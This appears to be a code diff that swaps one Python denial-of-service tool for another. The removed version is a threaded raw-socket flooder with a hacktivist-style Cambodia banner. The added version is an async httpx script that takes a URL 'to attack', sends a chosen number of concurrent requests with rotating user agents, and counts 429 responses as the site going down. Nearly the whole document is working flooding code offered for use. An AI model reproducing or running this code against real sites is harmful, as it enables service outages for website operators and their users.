@@ -1,143 +1,75 @@
 
+from random import choice
+import argparse
+import httpx
+import asyncio
+from rich.console import Console
+import validators
 
-import socket
-import time
-import os
-import random
 
-from threading import Thread
+async def random_user_agent():
+    user_agents = (
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 '
+        'Safari/537.36',
+        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 '
+        'Safari/537.36 Edg/114.0.1788.0',
+        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 '
+        'Safari/605.1.15',
+        'Mozilla/5.0 (Linux; Android 13; SM-A037U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile '
+        'Safari/537.36',
+        'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 '
+        'Mobile Safari/537.36 EdgA/46.3.4.5155',
+        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 '
+        'Safari/537.36 Vivaldi/3.7')
 
-os.system("clear")
+    return choice(user_agents)
 
-if not __name__ == "__main__":
-    exit()
-      
-class ConsoleColors:
-    HEADER = '\033[95mkra'
-    OKBLUE = '\033[94mkra'
-    OKGREEN = '\033[92'
-    WARNING = '\033[93makra'
-    FAIL = '\033[91m'
-    BOLD = '\033[1makra'
-    
-print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
-               
-               
-               
-                           
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠉⣉⣉⣉⣉⣉⣉⣉⡩⠙⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⡿⠟⢋⣡⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣄⣉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣡⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⡉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣁⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ Cambodia ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⠟⢡⣾⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣆⠙⢿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⡿⠃⣴⣿⣿⣿⡿⠛⠁⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠈⠙⠿⣿⣿⣿⣷⡀⠻⣿⣿⣿⣿⣿
-⣿⣿⣿⡿⢁⣾⣿⠟⢁⡾⠁⢀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⡀⠹⣆⠙⣿⣿⡄⠹⣿⣿⣿⣿
-⣿⣿⡿⢁⣾⡿⡏⠀⣼⣁⡴⢫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠀⣿⡆⠀⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢳⣄⣹⡀⠘⡿⣿  ⣿⣿⣿⣿
-⣿⣿⠁⣾⡟⢹⡇⢠⠟⠉⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣡⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠙⢇⠀⣿⠹⣿⡀⢻⣿⣿
-⣿⡇⢸⣿⠂⢸⡇⠀⣠⡞⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠶⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣦⡀⠀⣿⠀⢿⣧⠀⣿⣿
-⢿⠀⣾⣿⠀⢸⣧⠞⠁⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⠙⢦⣿⠀⢸⣿⡄⢸⣿
-⡇⢠⣿⢻⡄⠘⠁⢀⡴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠋⠀⣶⢻⡇⠀⣿
-⡁⢸⡏⠘⣇⠀⢰⡟⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⣿⣬⡉⣉⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⣦⠀⢠⡏⢘⣿⠀⣿
-⠇⢸⣏⠀⢹⣆⠟⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠉⠀⢰⣿⣟⡅⣝⣿⣿⠀⠈⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠘⣇⣾⠁⢸⣿⠀⣿
-⠀⢸⣿⡄⠈⣿⠀⢀⣏⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⢺⣿⣿⡇⢻⣿⣿⠀⠀⠀⠀⠀⠀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢹⠏⠀⣾⣿⠀⣿
-⡇⠘⣿⢷⡀⠈⠀⣼⠏⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠸⣿⡿⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠇⢿⡀⠘⠀⣼⢿⡇⠀⣿
-⣿⠀⢿⡈⠻⣆⠀⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠀⠀⣿⠃⠀⠀⠀.  ⠀⠈⢐⣿⣿⣿⣿⣿⣿⣿⠀⢸⡇⢠⡾⠋⣸⠃⢸⣿⣿
-⣿⡇⢸⣧⠀⠈⢷⡏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡏⠀⢘⣷⠋⠀⣰⡟⠀⣿⣿
-⣿⣿⡀⢻⣧⡀⠀⠙⠀⠐⣧⠹⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⢱⡇⠀⠜⠁⢀⣰⣿⠁⣸⣿⣿
-⣿⣿⣷⡈⢿⡙⠳⣤⣀⠀⢿⡀⠹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡿⠀⢾⠃⢀⣠⠶⠋⣽⠃⣰⣿⣿⣿
-⣿⣿⣿⣷⡈⢷⣄⠀⠉⠛⢾⣇⠀⠹⣞⢿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠁⢠⣿⠞⠋⠁⢀⣾⠋⣰⣿⣿⣿⣿
-⣿⣿⣿⣿⣷⡀⠻⣷⡦⣀⡀⠈⠃⠀⠙⣆⠉⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡞⠁⠀⠉⠀⣀⡤⣶⡿⠁⣰⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣆⠘⢿⣌⠙⠳⠶⠦⣤⣼⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣯⣤⣴⠶⠶⠛⢉⣾⠏⢀⣾⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣷⣄⠙⢿⣦⣤⣀⣀⣀⣀⣠⣤⣤⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣦⣠⣤⣀⣀⣀⣀⣠⣤⣾⠟⢁⣴⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡉⠻⣦⣉⠙⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⢉⣩⠾⠋⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠉⠻⢶⣶⣶⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣶⣶⣶⣶⠞⠋⢁⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣈⡙⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠟⠋⣉⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣠⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-                        🙏ខ្ញុំស្រលាញ់ប្រទេសកម្ពុជា🙏
-                          anonymousx-sayermkra
-                          
-                          anonymous Cambodia ☺️🇰🇭☺️
-               
-               
-               
-               
-               
-      ''')
-      
-    
-def getport():
+
+async def request_one(session, url):
+    user_agent = await random_user_agent()
     try:
-        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
-        return p
-    except ValueError:
-        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
-        return 8000000
-
-host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "ផ្ទះ ip :\r\n")
-port = getport()
-speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
-threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))
-
-ip = socket.gethostbyname(host)
-
-bytesToSend = random._urandom(2450)
-
-i = 1000;
+        responses = await session.get(url, headers={'User-agent': user_agent})
+    except (httpx.ConnectTimeout, httpx.ConnectError):
+        return False
+    return responses.status_code
 
 
+async def send_request(url, request_num):
+    """
+    this funtion send request async to the url
+    with the number of time that the user want
+    :param url: the url to send the request to
+    :param request_num: number of request to send
+    :return:
+    """
+    async with httpx.AsyncClient(timeout=3) as client:
+        tasks = [request_one(client, url) for _ in range(request_num)]
+        result = await asyncio.gather(*tasks)
+        return result
 
-class Count:
-    packetCounter = 1
 
-def goForDosThatThing():
-    try:
-        while True:
-            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            try:
-                dosSocket.connect((ip, port))
-                for i in range(speedPerRun):
-                    try:
-                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
-                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----🥀PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " -----🥀")
-                        Count.packetCounter = Count.packetCounter + 1
-                    except socket.error:
-                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
-                    except KeyboardInterrupt:
-                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
-            except socket.error:
-                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
-            except KeyboardInterrupt:
-                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
-            dosSocket.close()
-    except KeyboardInterrupt:
-        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
-try:
-        
-    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
-    _   _   _             _      ____  _             _   _             
-   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
-  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
- / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
-/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
-                                                                 |___/ 
-          ''')
-    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
-    time.sleep(1)
-    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====    🇰🇭           ] 25%")
-    time.sleep(1)
-    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========     🇰🇭     ] 50%")
-    time.sleep(1)
-    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [=============== 🇰🇭     ] 75%")
-    time.sleep(1)
-    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
-    
-    for i in range(threads):
-        try:
-            t = Thread(target=goForDosThatThing)
-            t.start()
-        except KeyboardInterrupt:
-            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
-except KeyboardInterrupt:
-    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument('url', type=str, help='the url to attack')
+    parser.add_argument('num', type=int, help='how match request to send')
+    args = parser.parse_args()
+    if validators.url(args.url):
+        console = Console()
+        with console.status('start ddos'):
+            res = asyncio.run(send_request(args.url, args.num))
+            success = 0
+            site_down = 0
+            for i in res:
+                if i in [200, 301, 302, 404, 400]:
+                    success += 1
+                elif i == 429:
+                    site_down += 1
+            print(f'successfully request {success}')
+            print(f'web site down status {site_down}')
+            print(f'failed request {args.num - success + site_down}')
+            exit()
+    print('Invalid url try different url')
+
+
+if __name__ == '__main__':
+    main()
